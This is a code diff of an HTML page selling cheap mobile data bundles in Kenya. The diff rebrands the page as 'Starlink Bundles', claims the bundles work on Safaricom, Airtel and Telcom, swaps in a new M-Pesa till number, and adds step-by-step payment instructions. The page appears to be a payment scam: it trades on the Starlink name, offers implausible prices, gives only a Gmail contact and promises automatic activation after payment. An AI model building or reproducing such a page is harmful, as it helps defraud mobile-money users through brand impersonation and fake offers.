@@ -3,13 +3,13 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>starnet</title>
+  <title>Starlink Bundles</title>
   <style>
     :root{
-      --g-dark: #27ae60;   /* emerald */
-      --g-mid:  #2ecc71;   /* bright green */
-      --g-soft: #a3e635;   /* lime accent */
-      --g-bg:   #e8f9f0;   /* pale greenish background */
+      --g-dark: #27ae60;
+      --g-mid:  #2ecc71;
+      --g-soft: #a3e635;
+      --g-bg:   #e8f9f0;
       --white:  #ffffff;
       --muted:  #555;
     }
@@ -20,7 +20,6 @@
       background: linear-gradient(180deg, #1b5e20 0%, #2ecc71 45%, #27ae60 100%);
       color:#1b1b1b;
     }
-
     header{
       text-align:center;
       padding:22px 12px;
@@ -31,9 +30,7 @@
       letter-spacing:0.6px;
       box-shadow:0 4px 14px rgba(0,0,0,0.25);
     }
-
     .wrap{ max-width:760px; margin:18px auto; padding:18px; }
-
     .lead-card{
       background:var(--white);
       border-radius:12px;
@@ -45,7 +42,6 @@
     .lead-card h1{ margin:0; color:var(--g-dark); font-size:22px }
     .lead-card p{ margin:10px 0 0; color:var(--muted); font-style:italic }
 
-    /* bundle containers */
     .bundle {
       background: var(--white);
       display:flex;
@@ -60,13 +56,12 @@
     }
     .bundle:hover{ transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,0.14); }
 
-    /* different shapes */
-    .b1{ border-radius:14px; border-left:8px solid var(--g-mid); }
-    .b2{ border-radius:40px; font-size:1.1em; border-left:10px solid var(--g-soft); }
+    .b2{ border-radius:40px; font-size:1.05em; border-left:10px solid var(--g-soft); }
     .b3{ border-radius:4px; font-weight:700; border-left:6px solid var(--g-dark); }
     .b4{ border-radius:20px 0 20px 0; border-left:8px solid #1e8449; }
-    .b5{ border-radius:30px; font-size:1.2em; border-left:10px solid #145a32; }
+    .b5{ border-radius:30px; font-size:1.05em; border-left:10px solid #145a32; }
     .b6{ border-radius:16px; border-left:7px solid var(--g-mid); }
+    .b7{ border-radius:12px; border-left:7px solid #0b7a3f; }
 
     .bundle .title{ font-weight:700; color:var(--g-dark) }
     .bundle .sub{ font-size:13px; color:var(--muted) }
@@ -82,7 +77,6 @@
       font-weight:700;
     }
 
-    /* Support email */
     .support{
       margin-top:20px;
       background:var(--white);
@@ -115,7 +109,6 @@
     }
     .email-card a{ color:var(--g-dark); font-weight:800; text-decoration:none }
 
-    /* Popup */
     .popup{
       display:none;
       position:fixed;
@@ -124,92 +117,72 @@
       align-items:center;
       justify-content:center;
       padding:18px;
+      z-index:999;
     }
     .popup.show{ display:flex; }
-
     .modal{
       background:var(--white);
       border-radius:12px;
       padding:18px;
-      max-width:500px;
-      width:95%;   
-      height:95vh; 
+      max-width:520px;
+      width:98%;
+      max-height:95vh;
       display:flex;
       flex-direction:column;
-      justify-content:space-between; /* keep content and button apart */
       overflow-y:auto;
       animation:pop .25s ease;
     }
-    @keyframes pop { from{opacity:0;transform:scale(.9)} to{opacity:1;transform:scale(1)} }
-
+    @keyframes pop { from{opacity:0;transform:scale(.98)} to{opacity:1;transform:scale(1)} }
     .modal h3{ margin:0 0 10px; color:var(--g-dark) }
+    .steps { font-size:16px; font-weight:500; margin-top:10px; line-height:1.6; text-align:left }
+    .steps li{ margin:10px 0; list-style-position:inside }
+
     .till-box{
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      background:var(--g-bg);
-      border-left:6px solid var(--g-mid);
-      padding:12px;
-      border-radius:10px;
+      display:flex; justify-content:space-between; align-items:center;
+      background:var(--g-bg); border-left:6px solid var(--g-mid);
+      padding:12px; border-radius:10px; margin-top:8px;
     }
-    .till-num{ font-weight:800; color:#145a32; }
-    .till-copy{ background:var(--g-mid); color:white; border:0; padding:8px 12px; border-radius:6px; cursor:pointer; }
-
-    /* Updated instructions style */
-    .steps {
-      font-size: 16px;
-      font-family: "Segoe UI", Roboto, Arial, sans-serif;
-      font-weight: 500;
-      color: #1b1b1b;
-      margin-top: 16px;
-      padding-left: 0;
-      width: 100%;
-      line-height: 1.6;
-      text-align: left;
-    }
-    .steps li {
-      margin: 12px 0;
-      list-style-position: inside;
-    }
-
-    .close{ margin-top:12px; width:100%; padding:10px; border:0; background:#d32f2f; color:white; border-radius:8px; font-weight:700; cursor:pointer }
+    .till-info{ display:flex; flex-direction:column; }
+    .till-label{ font-size:13px; color:#666; margin-bottom:6px }
+    .till-num{ font-weight:800; color:#145a32; font-size:18px; letter-spacing:1px }
+    .till-copy{ background: linear-gradient(90deg, var(--g-mid), var(--g-dark)); color:white; border:0; padding:8px 12px; border-radius:6px; cursor:pointer; font-weight:700 }
+    .copy-feedback{ font-size:13px; color:#145a32; margin-left:8px; opacity:0; transition:opacity .18s ease }
+    .copy-feedback.show{ opacity:1 }
+    .understand-btn{ margin-top:16px; width:100%; padding:12px; border:0; background: linear-gradient(90deg, var(--g-mid), var(--g-dark)); color:white; border-radius:8px; font-weight:700; cursor:pointer }
+    .small-note{ color:var(--muted); font-size:14px; margin-top:8px }
   </style>
 </head>
 <body>
-  <header>starnet bundles</header>
+  <header>Starlink Bundles</header>
 
   <div class="wrap">
     <div class="lead-card">
-      <h1>STARNET KENYA</h1>
-      <p>Reliable & Affordable Internet Bundles for Every Network</p>
+      <h1>Select a Package</h1>
+      <p>Starlink Home (Safaricom, Airtel, Telcom)</p>
     </div>
 
-    <div class="bundle b1" onclick="openPopup('1 Day - 5GB','55')">
+    <!-- Correct bundles only -->
+    <div class="bundle b2" onclick="openPopup('1 Day - 5GB','55')">
       <div><div class="title">1 Day - 5GB</div><div class="sub">All networks</div></div>
       <div><div class="price">Ksh 55</div><button class="buy-btn">Buy</button></div>
     </div>
-
-    <div class="bundle b2" onclick="openPopup('3 Days - 7GB','79')">
+    <div class="bundle b3" onclick="openPopup('3 Days - 7GB','79')">
       <div><div class="title">3 Days - 7GB</div><div class="sub">All networks</div></div>
       <div><div class="price">Ksh 79</div><button class="buy-btn">Buy</button></div>
     </div>
-
-    <div class="bundle b3" onclick="openPopup('7 Days - 9GB','99')">
+    <div class="bundle b4" onclick="openPopup('7 Days - 9GB','99')">
       <div><div class="title">7 Days - 9GB</div><div class="sub">All networks</div></div>
       <div><div class="price">Ksh 99</div><button class="buy-btn">Buy</button></div>
     </div>
-
-    <div class="bundle b4" onclick="openPopup('14 Days - 15GB','155')">
+    <div class="bundle b5" onclick="openPopup('14 Days - 15GB','155')">
       <div><div class="title">14 Days - 15GB</div><div class="sub">All networks</div></div>
       <div><div class="price">Ksh 155</div><button class="buy-btn">Buy</button></div>
     </div>
-
-    <div class="bundle b5" onclick="openPopup('30 Days - 25GB','225')">
+    <div class="bundle b6" onclick="openPopup('30 Days - 25GB','225')">
       <div><div class="title">30 Days - 25GB</div><div class="sub">All networks</div></div>
       <div><div class="price">Ksh 225</div><button class="buy-btn">Buy</button></div>
     </div>
-
-    <div class="bundle b6" onclick="openPopup('30 Days - Unlimited','269')">
+    <div class="bundle b7" onclick="openPopup('30 Days - Unlimited','269')">
       <div><div class="title">30 Days - Unlimited</div><div class="sub">All networks</div></div>
       <div><div class="price">Ksh 269</div><button class="buy-btn">Buy</button></div>
     </div>
@@ -218,7 +191,7 @@
       <button class="email-toggle" onclick="toggleEmail()">📧 Email Support</button>
       <div id="emailBox" class="email-reveal">
         <div class="email-card">
-          <p>Contact: <a href="mailto:starnetkenya46@gmail.com">starnetkenya46@gmail.com</a></p>
+          <p style="margin:0">Contact: <a href="mailto:starnetkenya46@gmail.com">starnetkenya46@gmail.com</a></p>
         </div>
       </div>
     </div>
@@ -226,38 +199,77 @@
 
   <!-- Popup -->
   <div id="popup" class="popup" onclick="if(event.target===this)closePopup()">
-    <div class="modal">
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="mpesaTitle">
       <div>
-        <h3>M-Pesa Payment</h3>
-        <div class="till-box">
-          <div>Till Number <div class="till-num" id="tillNum">6410336</div></div>
-          <button class="till-copy" onclick="copyTill()">Copy</button>
-        </div>
-        <p id="chosenPlan"></p>
+        <h3 id="mpesaTitle">M-Pesa Payment Instructions</h3>
+        <p id="chosenPlan" style="font-weight:700; margin-top:6px; color:var(--g-dark)"></p>
+
+        <!-- New guide line -->
+        <p style="margin:10px 0; font-weight:500; color:#333;">
+          Please follow the steps below to complete the process:
+        </p>
+
         <ol class="steps">
-          <li>Go to M-Pesa</li><li>Select Lipa na M-Pesa</li><li>Buy Goods and Services</li>
-          <li>Enter Till Number: 6410336</li><li>Enter Amount</li><li>Confirm Payment</li>
+          <li>Go to M-Pesa on your phone</li>
+          <li>Select <b>Lipa na M-Pesa</b></li>
+          <li>Select <b>Buy Goods and Services</b></li>
+          <li>Enter Till Number:</li>
         </ol>
+
+        <div class="till-box" style="margin-bottom:6px;">
+          <div class="till-info">
+            <div class="till-label">Till Number</div>
+            <div class="till-num" id="tillNum">4160709</div>
+          </div>
+          <div style="display:flex; align-items:center;">
+            <button class="till-copy" id="copyBtn" onclick="copyTill(event)">Copy</button>
+            <div id="copyFb" class="copy-feedback">Copied!</div>
+          </div>
+        </div>
+
+        <ol class="steps" start="5" style="margin-top:0;">
+          <li>Enter Amount: <b id="amount"></b></li>
+          <li>Enter your M-Pesa PIN</li>
+          <li>Confirm and send payment</li>
+        </ol>
+
+        <p class="small-note">Your package will be activated automatically after payment confirmation.</p>
       </div>
-      <button class="close" onclick="closePopup()">Done</button>
+
+      <button class="understand-btn" onclick="closePopup()">✔ I Understand</button>
     </div>
   </div>
 
   <script>
     function toggleEmail(){
-      const box = document.getElementById("emailBox");
-      box.classList.toggle("show");
+      document.getElementById("emailBox").classList.toggle("show");
     }
     function openPopup(plan, price){
-      document.getElementById("chosenPlan").textContent = `Selected: ${plan} — Ksh ${price}`;
+      document.getElementById("chosenPlan").textContent = `You have selected: ${plan} — Ksh ${price}`;
+      document.getElementById("amount").textContent = `Ksh ${price}`;
       document.getElementById("popup").classList.add("show");
+      document.getElementById("copyFb").classList.remove("show");
     }
     function closePopup(){
       document.getElementById("popup").classList.remove("show");
     }
-    function copyTill(){
-      navigator.clipboard.writeText(document.getElementById("tillNum").textContent);
+    function copyTill(e){
+      e.stopPropagation();
+      const till = document.getElementById("tillNum").textContent.trim();
+      navigator.clipboard.writeText(till).then(showCopyFeedback).catch(()=>fallbackCopy(till));
     }
+    function fallbackCopy(text){
+      const ta=document.createElement("textarea");
+      ta.value=text;document.body.appendChild(ta);ta.select();
+      try{document.execCommand('copy');showCopyFeedback();}catch(err){alert('Copy failed — Till: '+text);}
+      document.body.removeChild(ta);
+    }
+    function showCopyFeedback(){
+      const fb=document.getElementById("copyFb");
+      fb.classList.add("show");
+      setTimeout(()=>fb.classList.remove("show"),1500);
+    }
+    document.addEventListener('keydown',e=>{ if(e.key==='Escape') closePopup(); });
   </script>
 </body>
 </html>
